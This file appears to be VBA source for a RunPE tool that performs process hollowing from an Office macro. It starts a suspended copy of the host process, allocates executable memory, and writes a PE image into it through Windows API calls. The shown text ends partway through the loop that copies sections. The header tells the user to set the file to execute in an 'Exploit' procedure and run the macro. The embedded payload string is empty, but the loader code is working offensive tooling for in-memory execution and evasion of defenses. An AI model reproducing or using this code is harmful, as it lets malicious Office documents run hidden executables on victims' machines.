' --------------------------------------------------------------------------------
' Title: VBA RunPE
' Filename: RunPE.vba
' GitHub: https://github.com/itm4n/VBA-RunPE
' Date: 2018-01-28
' Author: Clement Labro (@itm4n)
' Description: A RunPE implementation in VBA with Windows API calls. It is
'   compatible with both 32 bits and 64 bits versions of Microsoft Office.
'   The 32 bits version of Office can only run 32 bits executables and the 64 bits
'   version can only run 64 bits executables.
' Usage: 1. In the 'Exploit' procedure at the end of the code, set the path of the
'               file you want to execute (with optional arguments)
'        2. Enable View > Immediate Window (Ctrl + G) (to check execution and error
'               logs)
'        3. Run the macro!
' Tested on: - Windows 7 Pro 32 bits + Office 2010 32 bits
'            - Windows 7 Pro 64 bits + Office 2016 32 bits
'            - Windows 2008 R2 64 bits + Office 2010 64 bits
'            - Windows 10 Pro 64 bits + Office 2016 64 bits
' Credit: https://github.com/Zer0Mem0ry/RunPE (C++ RunPE implementation - 32 bits
'   only)
' --------------------------------------------------------------------------------

Option Explicit

' ================================================================================
'                      ~~~ IMPORT WINDOWS API FUNCTIONS ~~~
' ================================================================================
#If Win64 Then
    Private Declare PtrSafe Sub RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByVal sSource As LongPtr, ByVal lLength As Long)
    Private Declare PtrSafe Function GetModuleFileName Lib "KERNEL32" Alias "GetModuleFileNameA" (ByVal hModule As LongPtr, ByVal lpFilename As String, ByVal nSize As Long) As Long
    Private Declare PtrSafe Function CreateProcess Lib "KERNEL32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As LongPtr, ByVal lpThreadAttributes As LongPtr, ByVal bInheritHandles As Boolean, ByVal dwCreationFlags As Long, ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
    Private Declare PtrSafe Function GetThreadContext Lib "KERNEL32" (ByVal hThread As LongPtr, lpContext As CONTEXT) As Long
    Private Declare PtrSafe Function ReadProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByVal lpBuffer As LongPtr, ByVal nSize As Long, ByVal lpNumberOfBytesRead As Long) As Long
    Private Declare PtrSafe Function VirtualAllocEx Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByVal lpBuffer As LongPtr, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As Long) As Long
    Private Declare PtrSafe Function SetThreadContext Lib "KERNEL32" (ByVal hThread As LongPtr, lpContext As CONTEXT) As Long
    Private Declare PtrSafe Function ResumeThread Lib "KERNEL32" (ByVal hThread As LongPtr) As Long
    Private Declare PtrSafe Function TerminateProcess Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal uExitCode As Integer) As Long
#Else
    Private Declare Sub RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As Long, ByVal sSource As Long, ByVal lLength As Long)
    Private Declare Function GetModuleFileName Lib "KERNEL32" Alias "GetModuleFileNameA" (ByVal hModule As Long, ByVal lpFilename As String, ByVal nSize As Long) As Long
    Private Declare Function CreateProcess Lib "KERNEL32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Long, ByVal lpThreadAttributes As Long, ByVal bInheritHandles As Boolean, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
    Private Declare Function GetThreadContext Lib "KERNEL32" (ByVal hThread As Long, lpContext As CONTEXT) As Long
    Private Declare Function ReadProcessMemory Lib "KERNEL32" (ByVal hProcess As Long, ByVal lpBaseAddress As Long, ByVal lpBuffer As Long, ByVal nSize As Long, ByVal lpNumberOfBytesRead As Long) As Long
    Private Declare Function VirtualAllocEx Lib "KERNEL32" (ByVal hProcess As Long, ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
    Private Declare Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As Long, ByVal lpBaseAddress As Long, ByVal lpBuffer As Long, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As Long) As Long
    Private Declare Function SetThreadContext Lib "KERNEL32" (ByVal hThread As Long, lpContext As CONTEXT) As Long
    Private Declare Function ResumeThread Lib "KERNEL32" (ByVal hThread As Long) As Long
    Private Declare Function TerminateProcess Lib "KERNEL32" (ByVal hProcess As Long, ByVal uExitCode As Integer) As Long
#End If


' ================================================================================
'                           ~~~ WINDOWS STRUCTURES ~~~
' ================================================================================
' Constants used in structure definitions
Private Const IMAGE_NUMBEROF_DIRECTORY_ENTRIES = 16
Private Const IMAGE_SIZEOF_SHORT_NAME = 8
Private Const MAXIMUM_SUPPORTED_EXTENSION = 512
Private Const SIZE_OF_80387_REGISTERS = 80

#If Win64 Then
    Private Type M128A
        Low As LongLong     'ULONGLONG Low;
        High As LongLong    'LONGLONG High;
    End Type
#End If

' https://www.nirsoft.net/kernel_struct/vista/IMAGE_DOS_HEADER.html
Private Type IMAGE_DOS_HEADER
     e_magic As Integer         'WORD e_magic;
     e_cblp As Integer          'WORD e_cblp;
     e_cp As Integer            'WORD e_cp;
     e_crlc As Integer          'WORD e_crlc;
     e_cparhdr As Integer       'WORD e_cparhdr;
     e_minalloc As Integer      'WORD e_minalloc;
     e_maxalloc As Integer      'WORD e_maxalloc;
     e_ss As Integer            'WORD e_ss;
     e_sp As Integer            'WORD e_sp;
     e_csum As Integer          'WORD e_csum;
     e_ip As Integer            'WORD e_ip;
     e_cs As Integer            'WORD e_cs;
     e_lfarlc As Integer        'WORD e_lfarlc;
     e_ovno As Integer          'WORD e_ovno;
     e_res(4 - 1) As Integer    'WORD e_res[4];
     e_oemid As Integer         'WORD e_oemid;
     e_oeminfo As Integer       'WORD e_oeminfo;
     e_res2(10 - 1) As Integer  'WORD e_res2[10];
     e_lfanew As Long           'LONG e_lfanew;
End Type

' https://msdn.microsoft.com/fr-fr/library/windows/desktop/ms680305(v=vs.85).aspx
Private Type IMAGE_DATA_DIRECTORY
    VirtualAddress As Long      'DWORD   VirtualAddress;
    Size As Long                'DWORD   Size;
End Type

' https://msdn.microsoft.com/fr-fr/library/windows/desktop/ms680313(v=vs.85).aspx
Private Type IMAGE_FILE_HEADER
    Machine As Integer                  'WORD    Machine;
    NumberOfSections As Integer         'WORD    NumberOfSections;
    TimeDateStamp As Long               'DWORD   TimeDateStamp;
    PointerToSymbolTable As Long        'DWORD   PointerToSymbolTable;
    NumberOfSymbols As Long             'DWORD   NumberOfSymbols;
    SizeOfOptionalHeader As Integer     'WORD    SizeOfOptionalHeader;
    Characteristics As Integer          'WORD    Characteristics;
End Type

' https://msdn.microsoft.com/en-us/library/windows/desktop/ms680339(v=vs.85).aspx
Private Type IMAGE_OPTIONAL_HEADER
    #If Win64 Then
        Magic As Integer                        'WORD        Magic;
        MajorLinkerVersion As Byte              'BYTE        MajorLinkerVersion;
        MinorLinkerVersion As Byte              'BYTE        MinorLinkerVersion;
        SizeOfCode As Long                      'DWORD       SizeOfCode;
        SizeOfInitializedData As Long           'DWORD       SizeOfInitializedData;
        SizeOfUninitializedData As Long         'DWORD       SizeOfUninitializedData;
        AddressOfEntryPoint As Long             'DWORD       AddressOfEntryPoint;
        BaseOfCode As Long                      'DWORD       BaseOfCode;
        ImageBase As LongLong                   'ULONGLONG   ImageBase;
        SectionAlignment As Long                'DWORD       SectionAlignment;
        FileAlignment As Long                   'DWORD       FileAlignment;
        MajorOperatingSystemVersion As Integer  'WORD        MajorOperatingSystemVersion;
        MinorOperatingSystemVersion As Integer  'WORD        MinorOperatingSystemVersion;
        MajorImageVersion As Integer            'WORD        MajorImageVersion;
        MinorImageVersion As Integer            'WORD        MinorImageVersion;
        MajorSubsystemVersion As Integer        'WORD        MajorSubsystemVersion;
        MinorSubsystemVersion As Integer        'WORD        MinorSubsystemVersion;
        Win32VersionValue As Long               'DWORD       Win32VersionValue;
        SizeOfImage As Long                     'DWORD       SizeOfImage;
        SizeOfHeaders As Long                   'DWORD       SizeOfHeaders;
        CheckSum As Long                        'DWORD       CheckSum;
        Subsystem As Integer                    'WORD        Subsystem;
        DllCharacteristics As Integer           'WORD        DllCharacteristics;
        SizeOfStackReserve As LongLong          'ULONGLONG   SizeOfStackReserve;
        SizeOfStackCommit As LongLong           'ULONGLONG   SizeOfStackCommit;
        SizeOfHeapReserve As LongLong           'ULONGLONG   SizeOfHeapReserve;
        SizeOfHeapCommit As LongLong            'ULONGLONG   SizeOfHeapCommit;
        LoaderFlags As Long                     'DWORD       LoaderFlags;
        NumberOfRvaAndSizes As Long             'DWORD       NumberOfRvaAndSizes;
        DataDirectory(IMAGE_NUMBEROF_DIRECTORY_ENTRIES - 1) As IMAGE_DATA_DIRECTORY 'IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
    #Else
        Magic As Integer                        'WORD    Magic;
        MajorLinkerVersion As Byte              'BYTE    MajorLinkerVersion;
        MinorLinkerVersion As Byte              'BYTE    MinorLinkerVersion;
        SizeOfCode As Long                      'DWORD   SizeOfCode;
        SizeOfInitializedData As Long           'DWORD   SizeOfInitializedData;
        SizeOfUninitializedData As Long         'DWORD   SizeOfUninitializedData;
        AddressOfEntryPoint As Long             'DWORD   AddressOfEntryPoint;
        BaseOfCode As Long                      'DWORD   BaseOfCode;
        BaseOfData As Long                      'DWORD   BaseOfData;
        ImageBase As Long                       'DWORD   ImageBase;
        SectionAlignment As Long                'DWORD   SectionAlignment;
        FileAlignment As Long                   'DWORD   FileAlignment;
        MajorOperatingSystemVersion As Integer  'WORD    MajorOperatingSystemVersion;
        MinorOperatingSystemVersion As Integer  'WORD    MinorOperatingSystemVersion;
        MajorImageVersion As Integer            'WORD    MajorImageVersion;
        MinorImageVersion As Integer            'WORD    MinorImageVersion;
        MajorSubsystemVersion As Integer        'WORD    MajorSubsystemVersion;
        MinorSubsystemVersion As Integer        'WORD    MinorSubsystemVersion;
        Win32VersionValue As Long               'DWORD   Win32VersionValue;
        SizeOfImage As Long                     'DWORD   SizeOfImage;
        SizeOfHeaders As Long                   'DWORD   SizeOfHeaders;
        CheckSum As Long                        'DWORD   CheckSum;
        Subsystem As Integer                    'WORD    Subsystem;
        DllCharacteristics As Integer           'WORD    DllCharacteristics;
        SizeOfStackReserve As Long              'DWORD   SizeOfStackReserve;
        SizeOfStackCommit As Long               'DWORD   SizeOfStackCommit;
        SizeOfHeapReserve As Long               'DWORD   SizeOfHeapReserve;
        SizeOfHeapCommit As Long                'DWORD   SizeOfHeapCommit;
        LoaderFlags As Long                     'DWORD   LoaderFlags;
        NumberOfRvaAndSizes As Long             'DWORD   NumberOfRvaAndSizes;
        DataDirectory(IMAGE_NUMBEROF_DIRECTORY_ENTRIES - 1) As IMAGE_DATA_DIRECTORY 'IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
    #End If
End Type

' https://msdn.microsoft.com/fr-fr/library/windows/desktop/ms680336(v=vs.85).aspx
Private Type IMAGE_NT_HEADERS
    Signature As Long                         'DWORD Signature;
    FileHeader As IMAGE_FILE_HEADER           'IMAGE_FILE_HEADER FileHeader;
    OptionalHeader As IMAGE_OPTIONAL_HEADER   'IMAGE_OPTIONAL_HEADER OptionalHeader;
End Type

' https://www.nirsoft.net/kernel_struct/vista/IMAGE_SECTION_HEADER.html
Private Type IMAGE_SECTION_HEADER
    SecName(IMAGE_SIZEOF_SHORT_NAME - 1) As Byte 'UCHAR Name[IMAGE_SIZEOF_SHORT_NAME];
    Misc As Long                    'ULONG Misc;
    VirtualAddress As Long          'ULONG VirtualAddress;
    SizeOfRawData As Long           'ULONG SizeOfRawData;
    PointerToRawData As Long        'ULONG PointerToRawData;
    PointerToRelocations As Long    'ULONG PointerToRelocations;
    PointerToLinenumbers As Long    'ULONG PointerToLinenumbers;
    NumberOfRelocations As Integer  'WORD NumberOfRelocations;
    NumberOfLinenumbers As Integer  'WORD NumberOfLinenumbers;
    Characteristics As Long         'ULONG Characteristics;
End Type

' https://msdn.microsoft.com/fr-fr/library/windows/desktop/ms684873(v=vs.85).aspx
Private Type PROCESS_INFORMATION
    hProcess As LongPtr     'HANDLE hProcess;
    hThread As LongPtr      'HANDLE hThread;
    dwProcessId As Long     'DWORD dwProcessId;
    dwThreadId As Long      'DWORD dwThreadId;
End Type

' https://msdn.microsoft.com/en-us/library/windows/desktop/ms686331(v=vs.85).aspx
Private Type STARTUPINFO
    cb As Long                  'DWORD   cb;
    lpReserved As String        'LPSTR   lpReserved;
    lpDesktop As String         'LPSTR   lpDesktop;
    lpTitle As String           'LPSTR   lpTitle;
    dwX As Long                 'DWORD   dwX;
    dwY As Long                 'DWORD   dwY;
    dwXSize As Long             'DWORD   dwXSize;
    dwYSize As Long             'DWORD   dwYSize;
    dwXCountChars As Long       'DWORD   dwXCountChars;
    dwYCountChars As Long       'DWORD   dwYCountChars;
    dwFillAttribute As Long     'DWORD   dwFillAttribute;
    dwFlags As Long             'DWORD   dwFlags;
    wShowWindow As Integer      'WORD    wShowWindow;
    cbReserved2 As Integer      'WORD    cbReserved2;
    lpReserved2 As LongPtr      'LPBYTE  lpReserved2;
    hStdInput As LongPtr        'HANDLE  hStdInput;
    hStdOutput As LongPtr       'HANDLE  hStdOutput;
    hStdError As LongPtr        'HANDLE  hStdError;
End Type

' https://www.nirsoft.net/kernel_struct/vista/FLOATING_SAVE_AREA.html
Private Type FLOATING_SAVE_AREA
    ControlWord As Long                                 'DWORD   ControlWord;
    StatusWord As Long                                  'DWORD   StatusWord;
    TagWord As Long                                     'DWORD   TagWord;
    ErrorOffset As Long                                 'DWORD   ErrorOffset;
    ErrorSelector As Long                               'DWORD   ErrorSelector;
    DataOffset As Long                                  'DWORD   DataOffset;
    DataSelector As Long                                'DWORD   DataSelector;
    RegisterArea(SIZE_OF_80387_REGISTERS - 1) As Byte   'BYTE    RegisterArea[SIZE_OF_80387_REGISTERS];
    Spare0 As Long                                      'DWORD   Spare0;
End Type

Private Type CONTEXT
    #If Win64 Then
        ' Register parameter home addresses
        P1Home As LongLong                  'DWORD64 P1Home;
        P2Home As LongLong                  'DWORD64 P2Home;
        P3Home As LongLong                  'DWORD64 P3Home;
        P4Home As LongLong                  'DWORD64 P4Home;
        P5Home As LongLong                  'DWORD64 P5Home;
        P6Home As LongLong                  'DWORD64 P6Home;
        ' Control flags
        ContextFlags As Long                'DWORD ContextFlags;
        MxCsr As Long                       'DWORD MxCsr;
        ' Segment Registers and processor flags
        SegCs As Integer                    'WORD   SegCs;
        SegDs As Integer                    'WORD   SegDs;
        SegEs As Integer                    'WORD   SegEs;
        SegFs As Integer                    'WORD   SegFs;
        SegGs As Integer                    'WORD   SegGs;
        SegSs As Integer                    'WORD   SegSs;
        EFlags As Long                      'DWORD EFlags;
        ' Debug registers
        Dr0 As LongLong                     'DWORD64 Dr0;
        Dr1 As LongLong                     'DWORD64 Dr1;
        Dr2 As LongLong                     'DWORD64 Dr2;
        Dr3 As LongLong                     'DWORD64 Dr3;
        Dr6 As LongLong                     'DWORD64 Dr6;
        Dr7 As LongLong                     'DWORD64 Dr7;
        ' Integer registers
        Rax As LongLong                     'DWORD64 Rax;
        Rcx As LongLong                     'DWORD64 Rcx;
        Rdx As LongLong                     'DWORD64 Rdx;
        Rbx As LongLong                     'DWORD64 Rbx;
        Rsp As LongLong                     'DWORD64 Rsp;
        Rbp As LongLong                     'DWORD64 Rbp;
        Rsi As LongLong                     'DWORD64 Rsi;
        Rdi As LongLong                     'DWORD64 Rdi;
        R8 As LongLong                      'DWORD64 R8;
        R9 As LongLong                      'DWORD64 R9;
        R10 As LongLong                     'DWORD64 R10;
        R11 As LongLong                     'DWORD64 R11;
        R12 As LongLong                     'DWORD64 R12;
        R13 As LongLong                     'DWORD64 R13;
        R14 As LongLong                     'DWORD64 R14;
        R15 As LongLong                     'DWORD64 R15;
        ' Program counter
        Rip As LongLong                     'DWORD64 Rip
        ' Floating point state
        Header(2 - 1) As M128A              'M128A Header[2];
        Legacy(8 - 1) As M128A              'M128A Legacy[8];
        Xmm0 As M128A                       'M128A Xmm0;
        Xmm1 As M128A                       'M128A Xmm1;
        Xmm2 As M128A                       'M128A Xmm2;
        Xmm3 As M128A                       'M128A Xmm3;
        Xmm4 As M128A                       'M128A Xmm4;
        Xmm5 As M128A                       'M128A Xmm5;
        Xmm6 As M128A                       'M128A Xmm6;
        Xmm7 As M128A                       'M128A Xmm7;
        Xmm8 As M128A                       'M128A Xmm8;
        Xmm9 As M128A                       'M128A Xmm9;
        Xmm10 As M128A                      'M128A Xmm10;
        Xmm11 As M128A                      'M128A Xmm11;
        Xmm12 As M128A                      'M128A Xmm12;
        Xmm13 As M128A                      'M128A Xmm13;
        Xmm14 As M128A                      'M128A Xmm14;
        Xmm15 As M128A                      'M128A Xmm15;
        ' Vector registers
        VectorRegister(26 - 1) As M128A     'M128A VectorRegister[26];
        VectorControl As LongLong           'DWORD64 VectorControl;
        ' Special debug control registers
        DebugControl As LongLong            'DWORD64 DebugControl;
        LastBranchToRip As LongLong         'DWORD64 LastBranchToRip;
        LastBranchFromRip As LongLong       'DWORD64 LastBranchFromRip;
        LastExceptionToRip As LongLong      'DWORD64 LastExceptionToRip;
        LastExceptionFromRip As LongLong    'DWORD64 LastExceptionFromRip;
    #Else
        ' https://msdn.microsoft.com/en-us/library/windows/desktop/ms679284(v=vs.85).aspx
        ContextFlags As Long                'DWORD ContextFlags;
        Dr0 As Long                         'DWORD   Dr0;
        Dr1 As Long                         'DWORD   Dr1;
        Dr2 As Long                         'DWORD   Dr2;
        Dr3 As Long                         'DWORD   Dr3;
        Dr6 As Long                         'DWORD   Dr6;
        Dr7 As Long                         'DWORD   Dr7;
        FloatSave As FLOATING_SAVE_AREA     'FLOATING_SAVE_AREA FloatSave;
        SegGs As Long                       'DWORD   SegGs;
        SegFs As Long                       'DWORD   SegFs;
        SegEs As Long                       'DWORD   SegEs;
        SegDs As Long                       'DWORD   SegDs;
        Edi As Long                         'DWORD   Edi;
        Esi As Long                         'DWORD   Esi;
        Ebx As Long                         'DWORD   Ebx;
        Edx As Long                         'DWORD   Edx;
        Ecx As Long                         'DWORD   Ecx;
        Eax As Long                         'DWORD   Eax;
        Ebp As Long                         'DWORD   Ebp;
        Eip As Long                         'DWORD   Eip;
        SegCs As Long                       'DWORD   SegCs;  // MUST BE SANITIZED
        EFlags As Long                      'DWORD   EFlags; // MUST BE SANITIZED
        Esp As Long                         'DWORD   Esp;
        SegSs As Long                       'DWORD   SegSs;
        ExtendedRegisters(MAXIMUM_SUPPORTED_EXTENSION - 1) As Byte 'BYTE    ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];
    #End If
End Type


' ================================================================================
'                   ~~~ CONSTANTS USED IN WINDOWS API CALLS ~~~
' ================================================================================
Private Const MEM_COMMIT = &H1000
Private Const MEM_RESERVE = &H2000
Private Const PAGE_READWRITE = &H4
Private Const PAGE_EXECUTE_READWRITE = &H40
Private Const MAX_PATH = 260
Private Const CREATE_SUSPENDED = &H4
Private Const CONTEXT_FULL = &H10007


' ================================================================================
'                     ~~~ CONSTANTS USED IN THE MAIN SUB ~~~
' ================================================================================
Private Const IMAGE_DOS_SIGNATURE = &H5A4D          '0x5A4D      // MZ
Private Const IMAGE_NT_SIGNATURE = &H4550           '0x00004550  // PE00
Private Const IMAGE_FILE_MACHINE_I386 = &H14C       '32 bits PE (IMAGE_NT_HEADERS.IMAGE_FILE_HEADER.Machine)
Private Const IMAGE_FILE_MACHINE_AMD64 = &H8664     '64 bits PE (IMAGE_NT_HEADERS.IMAGE_FILE_HEADER.Machine)
Private Const SIZEOF_IMAGE_SECTION_HEADER = 40
#If Win64 Then
    Private Const SIZEOF_IMAGE_NT_HEADERS = 264
    Private Const SIZEOF_ADDRESS = 8
#Else
    Private Const SIZEOF_IMAGE_NT_HEADERS = 248
    Private Const SIZEOF_ADDRESS = 4
#End If


' ================================================================================
'                                ~~~ HELPERS ~~~
' ================================================================================

' --------------------------------------------------------------------------------
' Method:    ByteArrayLength
' Desc:      Returns the length of a Byte array
' Arguments: baBytes - An array of Bytes
' Returns:   The size of the array as a Long
' --------------------------------------------------------------------------------
Public Function ByteArrayLength(baBytes() As Byte) As Long
    On Error Resume Next
    ByteArrayLength = UBound(baBytes) - LBound(baBytes) + 1
End Function

' --------------------------------------------------------------------------------
' Method:    ByteArrayToString
' Desc:      Converts an array of Bytes to a String
' Arguments: baBytes - An array of Bytes
' Returns:   The String representation of the Byte array
' --------------------------------------------------------------------------------
Private Function ByteArrayToString(baBytes() As Byte) As String
    Dim strRes As String: strRes = ""
    Dim iCount As Integer
    For iCount = 0 To ByteArrayLength(baBytes) - 1
        If baBytes(iCount) <> 0 Then
            strRes = strRes & Chr(baBytes(iCount))
        Else
            Exit For
        End If
    Next iCount
    ByteArrayToString = strRes
End Function

' --------------------------------------------------------------------------------
' Method:    FileToByteArray
' Desc:      Reads a file as a Byte array
' Arguments: strFilename - Fullname of the file as a String (ex:
'                'C:\Windows\System32\cmd.exe')
' Returns:   The content of the file as a Byte array
' --------------------------------------------------------------------------------
Private Function FileToByteArray(strFilename As String) As Byte()
    ' File content to String
    Dim strFileContent As String
    Dim iFile As Integer: iFile = FreeFile
    Open strFilename For Binary Access Read As #iFile
        strFileContent = Space(FileLen(strFilename))
        Get #iFile, , strFileContent
    Close #iFile
    
    ' String to Byte array
    Dim baFileContent() As Byte
    baFileContent = StrConv(strFileContent, vbFromUnicode)

    FileToByteArray = baFileContent
End Function

' --------------------------------------------------------------------------------
' Method:    StringToByteArray
' Desc:      Convert a String to a Byte array
' Arguments: strContent - Input String representing the PE
' Returns:   The content of the String as a Byte array
' --------------------------------------------------------------------------------
Private Function StringToByteArray(strContent As String) As Byte()
    ' String to Byte array
    Dim baContent() As Byte
    baContent = StrConv(strContent, vbFromUnicode)
    StringToByteArray = baContent
End Function

' --------------------------------------------------------------------------------
' Method:    A
' Desc:      Append a Char to a String.
' Arguments: strA - Input String. E.g.: "AAA"
'            bChar - Input Char as a Byte. E.g.: 66 or &H42
' Returns:   The concatenation of the String and the Char. E.g.: "AAAB"
' --------------------------------------------------------------------------------
Private Function A(strA As String, bChar As Byte) As String
    A = strA & Chr(bChar)
End Function

' --------------------------------------------------------------------------------
' Method:    B
' Desc:      Append a String to another String.
' Arguments: strA - Input String 1. E.g.: "AAAA"
'            strB - Input String 2. E.g.: "BBBB"
' Returns:   The concatenation of the two Strings. E.g.: "AAAABBBB"
' --------------------------------------------------------------------------------
Private Function B(strA As String, strB As String) As String
    B = strA + strB
End Function


' ================================================================================
'                                ~~~ EMBEDDED PE ~~~
' ================================================================================

' CODE GENRATED BY PE2VBA
Private Function PE() As String
    Dim strPE As String
    strPE = ""
    PE = strPE
End Function


' ================================================================================
'                                   ~~~ MAIN ~~~
' ================================================================================

' --------------------------------------------------------------------------------
' Method:    RunPE
' Desc:      Main method. Executes a PE from the memory of Word/Excel
' Arguments: baImage - A Byte array representing a PE file
'            strArguments - A String representing the command line arguments
' Returns:   N/A
' --------------------------------------------------------------------------------
Public Sub RunPE(ByRef baImage() As Byte, strArguments As String)
    ' Populate IMAGE_DOS_HEADER structure
    ' |__ IMAGE_DOS_HEADER size is 64 (0x40)
    Dim structDOSHeader As IMAGE_DOS_HEADER
    Dim ptrDOSHeader As LongPtr: ptrDOSHeader = VarPtr(structDOSHeader)
    Call RtlMoveMemory(ptrDOSHeader, VarPtr(baImage(0)), 64)
    
    ' Check Magic Number (i.e. is it a PE file?)
    ' |__ Magic number = 0x5A4D or 23117 or 'MZ'
    If structDOSHeader.e_magic = IMAGE_DOS_SIGNATURE Then
        Debug.Print ("[+] |__ Magic number is OK.")
    Else
        Debug.Print ("[-] |__ Input file is not a valid PE.")
        Exit Sub
    End If
    
    ' Populate IMAGE_NT_HEADERS structure
    ' |__ IMAGE_NT_HEADERS start at offset DOSHeader->e_lfanew
    ' |__ IMAGE_NT_HEADERS size is 248 (0xf8) (32 bits)
    ' |__ IMAGE_NT_HEADERS size is 264 (0x108) (64 bits)
    Dim structNTHeaders As IMAGE_NT_HEADERS
    Dim ptrNTHeaders As LongPtr: ptrNTHeaders = VarPtr(structNTHeaders)
    Call RtlMoveMemory(ptrNTHeaders, VarPtr(baImage(structDOSHeader.e_lfanew)), SIZEOF_IMAGE_NT_HEADERS)
    
    ' Check NT headers Signature
    ' |__ NT Header Signature = 'PE00' or 0x00004550 or 17744
    If structNTHeaders.Signature = IMAGE_NT_SIGNATURE Then
        Debug.Print ("[+] |__ NT Header Signature is valid.")
    Else
        Debug.Print ("[-] |__ NT Header Signature is not valid.")
        Exit Sub
    End If
    
    ' Check CPU architecture
    Debug.Print ("[*] |__ Machine type: 0x" + Hex(structNTHeaders.FileHeader.Machine))
    #If Win64 Then
        If structNTHeaders.FileHeader.Machine = IMAGE_FILE_MACHINE_I386 Then
            Debug.Print ("[-] You're trying to inject a 32 bits binary into a 64 bits process!")
            Exit Sub
        End If
    #Else
        If structNTHeaders.FileHeader.Machine = IMAGE_FILE_MACHINE_AMD64 Then
            Debug.Print ("[-] You're trying to inject a 64 bits binary into a 32 bits process!")
            Exit Sub
        End If
    #End If
    
    ' Get the path of the current process executable
    Dim strCurrentFilePath As String
    strCurrentFilePath = Space(MAX_PATH) ' Allocate memory to store the path
    Dim lGetModuleFileName As Long
    lGetModuleFileName = GetModuleFileName(0, strCurrentFilePath, MAX_PATH)
    strCurrentFilePath = Left(strCurrentFilePath, InStr(strCurrentFilePath, vbNullChar) - 1) ' Remove NULL bytes
    Debug.Print ("[*] Current process: '" + strCurrentFilePath + "'")
    
    ' Create new process in suspended state
    Dim strNull As String
    Dim structProcessInformation As PROCESS_INFORMATION
    Dim structStartupInfo As STARTUPINFO
    Dim lCreateProcess As Long
    lCreateProcess = CreateProcess(strNull, strCurrentFilePath + " " + strArguments, 0&, 0&, False, CREATE_SUSPENDED, 0&, strNull, structStartupInfo, structProcessInformation)
    If lCreateProcess = 0 Then
        Debug.Print ("[-] Process creation failed.")
        Exit Sub
    Else
        Debug.Print ("[+] Created new process in suspended state.")
    End If
    
    ' Get Thread context of the new process
    ' |__ CONTEXT_FULL - Identifier to use to get all the thread's important registers
    Dim structContext As CONTEXT
    structContext.ContextFlags = CONTEXT_FULL
    Dim lGetThreadContext As Long
    lGetThreadContext = GetThreadContext(structProcessInformation.hThread, structContext)
    If lGetThreadContext = 0 Then
        Debug.Print ("[-] |__ Couldn't get thread context.")
        Call TerminateProcess(structProcessInformation.hProcess, 0)
        Exit Sub
    Else
        Debug.Print ("[+] |__ Got thread context")
    End If
    
    ' Get image base address of the new process
    ' |__ Image base address is CONTEXT.ebx + 8 (32 bits)
    ' |__ Image base address is CONTEXT.rdx + 16 (64 bits)
    Dim lImageBase As LongPtr
    #If Win64 Then
        Dim lImageBaseAddrLocation As LongPtr: lImageBaseAddrLocation = structContext.Rdx + 16
    #Else
        Dim lImageBaseAddrLocation As LongPtr: lImageBaseAddrLocation = structContext.Ebx + 8
    #End If
    Dim ptrImageBase As LongPtr: ptrImageBase = VarPtr(lImageBase)
    Dim lReadProcessMemory As Long
    lReadProcessMemory = ReadProcessMemory(structProcessInformation.hProcess, lImageBaseAddrLocation, ptrImageBase, SIZEOF_ADDRESS, 0)
    If lReadProcessMemory = 0 Then
        Debug.Print ("[-] |__ Couldn't read image base address.")
        Call TerminateProcess(structProcessInformation.hProcess, 0)
        Exit Sub
    Else
        Debug.Print ("[+] |__ Got image base address: 0x" + Hex(lImageBase))
    End If
    
    ' Allocate memory for the source image in the new process
    Dim lProcessImageBase As LongPtr
    lProcessImageBase = VirtualAllocEx(structProcessInformation.hProcess, structNTHeaders.OptionalHeader.ImageBase, structNTHeaders.OptionalHeader.SizeOfImage, MEM_COMMIT + MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    If lProcessImageBase = 0 Then
        Debug.Print ("[-] Couldn't allocate memory for the source image")
        Call TerminateProcess(structProcessInformation.hProcess, 0)
        Exit Sub
    Else
        Debug.Print ("[+] Allocated memory for the source image at address: 0x" + Hex(lProcessImageBase))
    End If
    
    ' Write PE headers at the beginning of the allocated buffer
    Debug.Print ("[*] Writing PE headers")
    Dim lWriteProcessMemory As Long
    lWriteProcessMemory = WriteProcessMemory(structProcessInformation.hProcess, lProcessImageBase, VarPtr(baImage(0)), structNTHeaders.OptionalHeader.SizeOfHeaders, 0&)
    If lWriteProcessMemory = 0 Then
        Debug.Print ("[-] Error: 'WriteProcessMemory'")
        Call TerminateProcess(structProcessInformation.hProcess, 0)
        Exit Sub
    Else
        Debug.Print ("[+] Wrote PE Headers at: 0x" + Hex(lProcessImageBase) + " (size:" + Str(structNTHeaders.OptionalHeader.SizeOfHeaders) + ")")
    End If
    
    ' Write sections of the PE to the allocated buffer
    Dim iCount As Integer
    Dim structSectionHeader As IMAGE_SECTION_HEADER
    Dim ptrSectionHeader As LongPtr: ptrSectionHeader = VarPtr(structSectionHeader)
    For iCount = 0 To structNTHeaders.FileHeader.NumberOfSections - 1
        ' Nth section is at offset:
        '  0 (image base)
        '  + DOSHeader->e_lfanew  NT headers base address
        '  + 248 OR 264           IMAGE_NT_HEADERS size is 248 (32 bits) or 264 (64 bits)
        '  + N * 40               IMAGE_SECTION_HEADER is 40 (32 & 64 bits)
